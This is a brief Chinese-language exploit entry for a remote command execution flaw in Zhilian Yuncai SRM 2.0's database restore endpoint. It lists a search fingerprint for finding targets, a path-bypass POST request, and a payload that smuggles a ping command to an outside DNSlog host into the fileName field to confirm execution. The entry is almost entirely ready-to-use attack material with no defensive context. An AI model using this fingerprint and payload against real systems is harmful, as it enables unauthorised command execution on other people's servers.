# 智联云采SRM2.0restore存在远程命令执行漏洞

智联云采SRM2.0restore ｜ 命令执行 ｜ —
- **指纹**：`title=="SRM 2.0"`
- **请求**：`POST /adpweb/static/..;/a/db/dbBackupScheme/restore HTTP/1.1`

**Payload**
```
fileName=1ping%20www.dnslog.cn
```
- **响应特征**：200 Dnslog回显